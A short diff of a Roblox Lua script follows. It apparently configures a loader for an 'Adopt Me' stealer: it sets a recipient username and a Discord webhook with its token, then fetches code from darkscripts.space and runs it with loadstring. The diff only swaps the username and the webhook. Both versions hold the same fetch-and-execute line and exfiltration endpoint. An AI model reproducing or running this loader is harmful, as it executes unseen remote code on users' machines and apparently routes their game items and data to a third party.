@@ -1,3 +1,3 @@
-Username = "TRIX375_2"
-Webhook = "https://discord.com/api/webhooks/1305194547214684251/OnnKqfYyMxBPSkBKMwfqfS5xxUAU8WsVq_FA43yF7x0idYi3VaIroqeVf-U_DoHOuXH5"
-loadstring(game:HttpGet("https://darkscripts.space/adoptme",true))()
+UserName = "TRlX375"
+Webhook = "https://discord.com/api/webhooks/1315369397199704104/XNNC1ldlEvin8pHrT9AoKwaHaIKbheCj6mMkRxTDFpm3ghhUtAvwsO9NddsDrJtDMypm"
+loadstring(game:HttpGet("https://darkscripts.space/adoptme", true))()
